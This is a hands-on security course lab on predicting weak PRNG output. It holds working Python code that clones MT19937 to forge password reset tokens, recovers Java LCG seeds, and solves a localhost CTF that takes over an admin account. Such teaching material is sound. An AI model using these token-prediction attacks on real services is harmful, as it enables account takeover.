---
title: "PRNG Attack Lab — MT19937 Clone, LCG Seed Recovery, and Token Prediction"
tags: [cryptography, PRNG, MT19937, LCG, Java-Random, seed-recovery,
  session-token, CTF, lab, hands-on, CWE-338, module-09-crypto-02]
module: 09-Crypto-02
day: 596
prerequisites:
  - Day 595 — MT19937 State Recovery
  - Basic modular arithmetic
related_topics:
  - LCG and LFSR Attacks (Day 599)
  - Differential Fault Analysis (Day 597)
---

# Day 596 — PRNG Attack Lab: MT19937 Clone, LCG Seed Recovery, Token Prediction

> "Three targets today. First: clone MT19937 from raw outputs and forge a
> password reset token. Second: crack Java's LCG seed from two `nextInt()`
> calls — two calls, one seed, done. Third: a CTF challenge that mixes both.
> By the end, you will have broken every 'secure' token system that does not
> use a CSPRNG. That is most of them."
>
> — Ghost

---

## Goals

Execute MT19937 state recovery against a password reset service, recover the
seed of a Linear Congruential Generator (LCG) from two outputs, and solve a
combined CTF challenge. Build the complete PRNG attack toolkit.

**Prerequisites:** Day 595 (MT19937 state recovery).
**Estimated lab time:** 4–5 hours.

---

## Lab 1 — MT19937: Password Reset Token Forgery

### The Vulnerable Service

A web app generates password reset tokens using Python's `random` module
seeded at startup. The reset tokens are `base64(random_bytes(16))` where
each byte is generated with `random.getrandbits(8)`.

```python
#!/usr/bin/env python3
"""
Vulnerable password reset service — MT19937-seeded token generation.
"""
import random
import base64
import time


class PasswordResetService:
    def __init__(self):
        # Seeded with current time — observable if you know when the server started
        self._rng = random.Random(int(time.time()))

    def generate_token(self, user_id: int) -> str:
        """Generate a 16-byte reset token as base64."""
        token_bytes = bytes(self._rng.getrandbits(8) for _ in range(16))
        return base64.urlsafe_b64encode(token_bytes).decode()

    def get_32bit_output(self) -> int:
        """Exposed PRNG output — simulates a public endpoint that leaks bits."""
        return self._rng.getrandbits(32)
```

### The Attack

```python
#!/usr/bin/env python3
"""
Attack: observe 624 32-bit outputs → clone MT19937 → forge the NEXT reset token.
"""
from __future__ import annotations
import random
import base64
import time


def untemper(y: int) -> int:
    """Invert MT19937 temper transform."""
    y ^= (y >> 18)
    y ^= (y << 15) & 0xEFC60000
    tmp = y
    for _ in range(4):
        tmp = y ^ ((tmp << 7) & 0x9D2C5680)
    y = tmp & 0xFFFFFFFF
    tmp = y
    for _ in range(3):
        tmp = y ^ (tmp >> 11)
    return tmp & 0xFFFFFFFF


def clone_mt19937(outputs_32bit: list[int]) -> random.Random:
    """Clone MT19937 from 624 consecutive 32-bit outputs."""
    state  = [untemper(y) for y in outputs_32bit[:624]]
    cloned = random.Random()
    cloned.setstate((3, tuple(state) + (624,), None))
    return cloned


# ── Simulation ────────────────────────────────────────────────────────────────
service = PasswordResetService()

# Attack phase 1: observe 624 outputs from any endpoint that leaks PRNG bits.
# In real web apps: CSRF tokens, rate-limit identifiers, or other non-secret
# values that use the same PRNG instance.
print("[*] Collecting 624 PRNG outputs from the public endpoint...")
observed = [service.get_32bit_output() for _ in range(624)]

# Clone the RNG
cloned = clone_mt19937(observed)

# The target requested a password reset (we know their user_id from OSINT)
# The reset token is the NEXT 16 bytes from the cloned RNG
actual_token    = service.generate_token(user_id=1337)
predicted_bytes = bytes(cloned.getrandbits(8) for _ in range(16))
predicted_token = base64.urlsafe_b64encode(predicted_bytes).decode()

print(f"[*] Actual reset token:    {actual_token}")
print(f"[*] Predicted reset token: {predicted_token}")
print(f"[+] Token forged correctly: {actual_token == predicted_token}")

if actual_token == predicted_token:
    print("\n[+] Exploit complete: attacker can now reset ANY user's password")
    print("    by requesting a reset and predicting the next token.")
```

---

## Lab 2 — LCG Seed Recovery: Java `java.util.Random`

Java's `java.util.Random` uses a **48-bit Linear Congruential Generator (LCG)**:

```
seed_next = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1)
output    = seed >> (48 - bits)   # for nextInt()/nextLong()
```

**Attack:** Given **two** consecutive 32-bit outputs, recover the 48-bit seed.

```python
#!/usr/bin/env python3
"""
Java java.util.Random LCG seed recovery from two consecutive nextInt() outputs.
"""
from __future__ import annotations

# Java Random LCG constants
MULTIPLIER = 0x5DEECE66D
ADDEND     = 0xB
MASK       = (1 << 48) - 1


def java_next(seed: int, bits: int) -> int:
    """Java's next(bits) method."""
    seed = (seed * MULTIPLIER + ADDEND) & MASK
    return seed >> (48 - bits), seed


def java_next_int(seed: int) -> tuple[int, int]:
    """Java's nextInt() — returns (value, new_seed)."""
    val, seed = java_next(seed, 32)
    return val, seed


def recover_seed_from_two_ints(out1: int, out2: int) -> int | None:
    """
    Given two consecutive nextInt() outputs, recover the 48-bit seed.
    The top 32 bits of the 48-bit seed produce the output.
    We brute-force the remaining 16 bits.
    """
    for low16 in range(1 << 16):
        # Candidate seed that produces out1 as nextInt()
        seed_candidate = (out1 << 16) | low16
        val2, _ = java_next_int(seed_candidate)
        if val2 == out2:
            # Verify: reconstruct the seed BEFORE out1 was generated
            # seed_before = (seed_candidate - ADDEND) * inverse(MULTIPLIER) mod MASK
            # Use brute force of the 16 LSBs instead
            print(f"[+] Seed after out1 found: {seed_candidate}")
            # Recover original seed: reverse one step
            inv_mult = pow(MULTIPLIER, -1, MASK + 1)
            seed_before = ((seed_candidate - ADDEND) * inv_mult) & MASK
            return seed_before
    return None


# ── Demo ──────────────────────────────────────────────────────────────────────
import random

# Simulate Java Random (Python approximation)
true_seed = random.getrandbits(48)
print(f"[*] True 48-bit seed: {true_seed}")

# Generate two consecutive outputs
out1, seed1 = java_next_int(true_seed)
out2, seed2 = java_next_int(seed1)
print(f"[*] out1 = {out1}, out2 = {out2} (attacker observes these)")

# Recover seed
recovered_seed_before = recover_seed_from_two_ints(out1, out2)
if recovered_seed_before is not None:
    print(f"[+] Recovered original seed: {recovered_seed_before}")
    # Verify: re-generate outputs from recovered seed
    v1, s1 = java_next_int(recovered_seed_before)
    v2, s2 = java_next_int(s1)
    print(f"[+] Re-generated: out1={v1} (match:{v1==out1}), out2={v2} (match:{v2==out2})")
    # Now predict all future outputs
    v3, _ = java_next_int(s2)
    print(f"[+] Predicted nextInt() #3: {v3}")
    # Actual #3 for verification
    v3_actual, _ = java_next_int(seed2)
    print(f"[+] Actual   nextInt() #3: {v3_actual}")
    print(f"[+] Prediction correct: {v3 == v3_actual}")
else:
    print("[!] Seed recovery failed")
```

---

## Lab 3 — CTF Challenge: "Token Factory" (Combined Attack)

```
Challenge:
  A service exposes two endpoints:
    GET /csrf     → Returns a CSRF token (32 bits from MT19937)
    POST /reset   → Accepts user_email, returns a 128-bit reset token
                    (16 consecutive bytes from the SAME MT19937 instance)

  The CSRF tokens and reset tokens share one MT19937 RNG.
  Collect 624 CSRF tokens. Predict the reset token for admin@corp.com
  before the admin requests it.

  Flag is embedded in the admin's account data, accessible after login
  with the forged reset token.
```

```python
#!/usr/bin/env python3
"""
CTF solve: Token Factory — collect CSRF tokens, predict reset token.
"""
import requests
import base64

BASE = "http://localhost:8080"   # Run challenge docker compose


def collect_csrf_tokens(n: int) -> list[int]:
    """Collect n CSRF tokens (each is a 32-bit hex integer)."""
    tokens = []
    for _ in range(n):
        resp = requests.get(f"{BASE}/csrf")
        tok  = int(resp.text.strip(), 16)   # Hex 32-bit value
        tokens.append(tok)
    return tokens


def predict_reset_token(csrf_tokens: list[int]) -> str:
    """Clone MT19937 and predict the next 16-byte reset token."""
    cloned = clone_mt19937(csrf_tokens)
    # Reset token = 16 bytes from getrandbits(8) × 16
    token_bytes = bytes(cloned.getrandbits(8) for _ in range(16))
    return base64.urlsafe_b64encode(token_bytes).decode().rstrip("=")


# Step 1: Collect CSRF tokens
print("[*] Collecting 624 CSRF tokens...")
csrf_tokens = collect_csrf_tokens(624)
print(f"[*] First 4 tokens: {csrf_tokens[:4]}")

# Step 2: Trigger admin reset (race condition: send within same server cycle)
print("[*] Triggering admin password reset...")
requests.post(f"{BASE}/reset", data={"user_email": "admin@corp.com"})

# Step 3: Predict the token that was just generated
predicted = predict_reset_token(csrf_tokens)
print(f"[*] Predicted reset token: {predicted}")

# Step 4: Use the predicted token to log in as admin
resp = requests.post(f"{BASE}/reset-confirm",
                     data={"token": predicted, "new_pass": "h4ck3d!"})
print(f"[*] Reset response: {resp.status_code}")

if resp.ok:
    # Step 5: Log in and retrieve flag
    login = requests.post(f"{BASE}/login",
                          data={"email": "admin@corp.com", "pass": "h4ck3d!"})
    flag_resp = requests.get(f"{BASE}/flag",
                             cookies=login.cookies)
    print(f"\n[+] FLAG: {flag_resp.text}")
```

---

## Self-Assessment

```
[ ] 1. In Lab 1, the service is re-seeded from time.time() on startup.
        If you know the server was started within the last hour, how does
        this change the attack? Can you seed-brute-force instead of observing
        624 outputs? Compare complexity.

[ ] 2. In the LCG attack, we brute-force 16 bits (65536 candidates).
        Why exactly 16? The seed is 48 bits and the output is 32 bits —
        what happened to the other 16 bits?

[ ] 3. Some systems shuffle the MT19937 output with XOR against a static
        secret: token = rng.getrandbits(32) XOR SECRET_KEY.
        Does this protect against state recovery? Prove your answer.

[ ] 4. Research: what PRNG does Python's `secrets` module use?
        How does it differ from `random`? Write a one-line code snippet
        showing the correct way to generate a 128-bit session token.
```

---

## Key Takeaways

1. **Two LCG outputs = full seed.** Java's Random, C's rand(), and most LCG
   implementations are broken with just two consecutive outputs. The 48-bit
   search is 65536 iterations — milliseconds on any CPU.
2. **624 MT19937 outputs = full state.** Once you have the state, you predict
   ALL future outputs with certainty — not just probabilities.
3. **The same PRNG serving different purposes is catastrophic.** If the
   same `random.Random()` instance generates CSRF tokens, session IDs, and
   password reset tokens, observing any 624 values from one type breaks all.
4. **The fix is one line:** `import secrets; token = secrets.token_urlsafe(32)`.
   There is no excuse for using `random` for anything security-sensitive.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q596.1, Q596.2 …).

---

## Navigation

← Previous: [Day 595 — MT19937 State Recovery](DAY-0595-MT19937-State-Recovery.md)
→ Next: [Day 597 — Differential Fault Analysis](DAY-0597-Differential-Fault-Analysis.md)
